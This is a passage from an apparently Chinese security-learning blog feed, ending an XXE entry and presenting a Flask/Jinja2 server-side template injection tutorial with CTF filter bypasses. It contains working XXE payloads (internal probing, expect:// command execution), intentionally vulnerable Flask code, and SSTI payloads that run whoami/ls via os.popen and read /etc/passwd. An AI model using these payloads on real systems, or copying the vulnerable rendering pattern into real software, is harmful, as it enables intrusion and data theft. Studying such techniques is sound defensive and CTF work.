<h2 id="3-探测内网地址"><a href="#3-探测内网地址" class="headerlink" title="3.探测内网地址"></a>3.探测内网地址</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload如下:</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.100:80&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>成功探测到内网端口内部信息。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233957877-1657490227.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>我这是在windows下测试，假如是linux下还可以命令执行:</p>
<p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
<p>测试payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;ifconfig&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>这里读取系统命令ifconfig读取ip</p>
<p>参考:<a href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
<p>大致学习一下XML的一些语法以及XML的注入漏洞</p>
]]></content>
  </entry>
  <entry>
    <title>python SSTI注入(一)</title>
    <url>/2021/02/28/python-SSTI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="基础知识学习"><a href="#基础知识学习" class="headerlink" title="基础知识学习"></a>基础知识学习</h2><h3 id="什么是SSTI注入"><a href="#什么是SSTI注入" class="headerlink" title="什么是SSTI注入"></a>什么是SSTI注入</h3><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。 <a id="more"></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;flag&#123;SSTI_123456&#125;&quot;</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;404_url&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>此时传参的变量为404_url，如果我们访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?404_url&#x3D;&#123;&#123;1-1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>页面将返回0。</p>
<p>在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>里，他将我们的代码进行了执行。服务器将我们的数据经过引擎解析的时候，进行了执行，模板注入与sql注入成因有点相似，都是信任了用户的输入，将不可靠的用户输入不经过滤直接进行了执行，用户插入了恶意代码同样也会执行。</p>
<p>直接将用户可控参数<code>request.args.get(&#39;404_url&#39;)</code>在模板中直接渲染并传回页面中，这种不正确的渲染方法会产生模板注入(SSTI)。</p>
<h3 id="Jinja2渲染模板"><a href="#Jinja2渲染模板" class="headerlink" title="Jinja2渲染模板"></a>Jinja2渲染模板</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p>
<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x01 &#123;%%&#125;</span><br></pre></td></tr></table></figure>

<p>主要用来声明变量或用在条件语句或循环语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意条件和循环需要多一层 &#123;%endif%&#125; 或 &#123;%endfor%&#125;用作结尾</span><br><span class="line"></span><br><span class="line">&#123;% set c &#x3D; &#39;Zh1z3ven&#39; %&#125;</span><br><span class="line">&#123;% if 1&#x3D;&#x3D;1 %&#125;Zh1z3ven&#123;%endif%&#125;</span><br><span class="line">&#123;% for i in [1, 2, 3] %&#125;Zh1z3ven&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x02 &#96;&#123;&#123;&#125;&#125;&#96;</span><br></pre></td></tr></table></figure>

<p>将大括号内的表达式执行并输出结果到模板内</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;98-2&#125;&#125; # 96</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x03 &#96;&#123;##&#125;&#96;</span><br></pre></td></tr></table></figure>

<p>注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[]，&#123;&#125;，”</span><br></pre></td></tr></table></figure>

<p>是Python中的内置变量。通过内置变量的一些属性或函数去访问当前Python环境中的对象继承树，可以从继承树爬到根对象类。利用__subclasses__()等函数爬向每一个Object,这样便可以利用当前Python环境执行任意代码。</p>
<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
<p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
<p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p>
<p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p>
<p>让我们用例子来简析模板渲染。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;$what&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户的为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。</p>
<h3 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h3><p>在Python的ssti中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti，接下来讲几个知识点。</p>
<ul>
<li><code>__class__</code></li>
</ul>
<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
<ul>
<li><code>__bases__</code></li>
</ul>
<p>以元组的形式返回一个类所直接继承的类。</p>
<ul>
<li><code>__base__</code></li>
</ul>
<p>以字符串返回一个类所直接继承的类。</p>
<ul>
<li><code>__mro__</code></li>
</ul>
<p>返回解析方法调用的顺序。</p>
<ul>
<li><code>__subclasses__()</code></li>
</ul>
<p>获取类的所有子类。</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。<br>该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用<strong>globals</strong>属性访问全局的变量。该属性保存的是函数全局变量的<strong>字典</strong>引用。</p>
<p><code>__builtins__</code></p>
<p><code>__builtins__</code>下有<code>eval</code>，<code>__import__</code>等的函数，可以利用此来执行命令。</p>
<p>在看完上边这些自带方法、成员变量后，可能有点懵，接下来看看是如何利用这些方法以及成员变量达到我们想要的目的的。</p>
<p>在SSTI中，我们要做的无非就两个：</p>
<ul>
<li>执行命令</li>
<li>获取文件内容</li>
</ul>
<p>所以我们所做的一切实际上都是在往这两个结果靠拢。</p>
<p>例1:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> []._class_._base_.subclasses_()<span class="comment">#通过内置变量访问类——&gt;使用base输出类的父级——在通过subclasses()找到所有此父级的子级。</span></span><br></pre></td></tr></table></figure>

<h2 id="SSTI注入产生原因"><a href="#SSTI注入产生原因" class="headerlink" title="SSTI注入产生原因:"></a>SSTI注入产生原因:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;hwg&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;h1&gt;Hello, %s !&lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>% (name))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;&#123;title&#125;&#125; - hwg&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">      &lt;h1&gt;Hello, &#123;&#123;user.name&#125;&#125;!&lt;/h1&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="comment">###########################</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/index&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    user = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> : <span class="string">&#x27;hwg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;info&#x27;</span> : <span class="string">&#x27;I am hwg&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, title=<span class="string">&#x27;Home&#x27;</span>, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>对比上下两种代码书写两种形式:在第一种中，name参数是我们可控的，name参数后面会被直接渲染并将结果待会页面回显，所以这时就有了ssti注入:<br>在第二种中:<br>在flask中常用的渲染方法为<code>render_template()</code> 、 <code>render_template_string()</code></p>
<p>当使用 <code>render_template()</code> 时，扩展名为 <code>.html</code> 、 <code>.htm</code> 、 <code>.xml</code> 和 <code>.xhtml</code> 的模板中开启自动转义。</p>
<p>当使用 <code>render_template_string()</code> 时，字符串开启 自动转义。<br>分析一下，<strong>就是此时页面数据已经确定，并且渲染时将会被转义，即你输入的数据不会被当做指令执行</strong>，而是作为那两个花括号的一个内容进行渲染，可以看到render_template渲染的内容是index.html，而不是用户输入的数据。<br><strong>所以ssti产生原因便是：</strong><br>1.存在用户可控参数<br>2.用户输入参数直接被渲染，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可被带入代码中让jinja2模块识别并解析</p>
<h2 id="flask——ssti环境实战"><a href="#flask——ssti环境实战" class="headerlink" title="flask——ssti环境实战:"></a>flask——ssti环境实战:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%sfrom flask import Flask, request</span></span><br><span class="line"><span class="string">from jinja2 import Template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app = Flask(__name__)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="string">def test1():</span></span><br><span class="line"><span class="string">    name = request.args.get(&#x27;name&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    t = Template(&#x27;&#x27;&#x27;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Zh1z3ven&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello, %s !&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;% (name))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return t.render()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="string">    app.run(host=&#x27;127.0.0.1&#x27;, debug=True)&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<h3 id="漏洞使用思路"><a href="#漏洞使用思路" class="headerlink" title="漏洞使用思路"></a>漏洞使用思路</h3><p>首先我们使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__<span class="comment">#这里的引号是为了引出父类任何数据结构都行包括[]&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>获取类，此时会返回类是str<br>再使用bases或者mro获取到object基类（因为object是所有类的基（父）类）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__</span><br></pre></td></tr></table></figure>

<p>接下来获取其所有子类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228143230.png" alt="img" style="zoom:67%;">我们只需要寻找可能执行命令或者可以读取文件的类就可以了，重点关注os/file这些关键字。</p>
<p>获取到subclasses后，初步看了一下没有能直接执行命令或者获取文件内容的，接下来使用<strong>init</strong>.<strong>globals</strong>来看看有没有os module或者其他的可以读写文件的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">303</span>].__init__.__globals__&#125;&#125;</span><br><span class="line"><span class="comment">#此时更换为花括号 因为是要执行命令了，而这个303是通过爆破得到的，爆破到具有os模块，OS模块是Python标准库中的一个用于访问操作系统功能的模块</span></span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br><span class="line">//此时就会回显用户名</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228143711.png" alt="img" style="zoom:67%;">

<h2 id="CTF中的bypass"><a href="#CTF中的bypass" class="headerlink" title="CTF中的bypass"></a>CTF中的bypass</h2><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>我们如果想知道过滤了什么的时候，可以直接在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>中测试我们输入的内容，看看网页会不会回显</p>
<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>可以使用[]，’’代替第一个双引号<br>第二个双引号的作用:获取字典内对应索引的value<br>这里介绍一种查看方法,在python中使用type(内容)，可以查询内容的类性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type(&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228181132.png" alt="img" style="zoom:67%;">
此时我们可以知道 ：
后面的数据类型需要的是dict这里我们可以使用request.args来绕过此处引号的过滤。

<p>request.args是flask中一个存储着请求参数以及其值的字典，<br>使用方法:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__[request.args.arg1]&#125;&#125;&amp;arg1=os</span><br></pre></td></tr></table></figure>

<p>此时即可绕过后面双引号的过滤<br>这里还有一种方法：<br>还有另外一种绕过引号的办法，即通过python自带函数来绕过引号，这里使用的是chr()。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>爆破subclasses中chr()函数在哪</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%set+chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__[chr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)][chr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">110</span>)](chr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>为什么要这样构造？:</p>
<p><code>&#123;% ... %&#125;</code> for <a href="https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-control-structures">Statements</a> ,可以实现for,if等语句,还支持set语法,可以给变量赋值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%set chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;</span><br></pre></td></tr></table></figure>

<p>先获取chr函数，赋值给chr，此时chr就拥有chr函数的功能了，然后接下来在后面拼接需要使用chr进行绕过的字符，如””</p>
<h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>回看最初的payload，过滤中括号对我们影响最大的是什么，前边两个中括号都是为了从数组中取值，而后续的中括号实际是不必要的，<strong>globals</strong>[“os”]可以替换为<strong>globals</strong>.os。</p>
<p>所以过滤了中括号实际上影响我们的只有从数组中取值，然而从数组中取值，而从数组中取值可以使用pop/<strong>getitem</strong>等数组自带方法。</p>
<p>不过还是建议用<strong>getitem</strong>，因为pop会破坏数组的结构。</p>
<p>a[0]与a.<strong>getitem</strong>(0)的效果是一样的，所以上述payload可以用此来绕过：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__()[<span class="number">300</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>如果没用过滤引号,使用反转,或者各种拼接绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__snitliub__&#x27;</span>[::<span class="number">-1</span>]][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>[::<span class="number">-1</span>]][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>第二种绕过过滤关键字的办法即使用request对象：<br><strong>flask获取参数方式：</strong></p>
<p>request.form.get(“key”, type=str, default=None) 获取表单数据</p>
<p>request.args.get(“key”) 获取get请求参数</p>
<p>request.values.get(“key”) 获取所有参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;&quot;</span>.__getattribute__(request.args.a)&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>

<p>第三种是寻找其原生函数</p>
<h3 id="过滤点"><a href="#过滤点" class="headerlink" title="过滤点"></a>过滤点</h3><p>在python中，可用以下表示法可用于访问对象的属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&quot;__class__&quot;</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;getattr(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说我们可以通过<code>[]</code>，<code>|attr()</code>，<code>getattr()</code>来绕过点</p>
<h2 id="常用语句："><a href="#常用语句：" class="headerlink" title="常用语句："></a>常用语句：</h2><p>任意文件读取:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="读取到class可以后所指向的可以被继承的函数小结"><a href="#读取到class可以后所指向的可以被继承的函数小结" class="headerlink" title="读取到class可以后所指向的可以被继承的函数小结"></a>读取到class可以后所指向的可以被继承的函数小结</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3的</span><br><span class="line">75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __builtins__ None</span><br><span class="line">75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__ None</span><br><span class="line">75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; sys None</span><br><span class="line">76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __builtins__ None</span><br><span class="line">76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__ None</span><br><span class="line">76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; sys None</span><br><span class="line">77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __builtins__ None</span><br><span class="line">77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__ None</span><br><span class="line">77 &lt;class 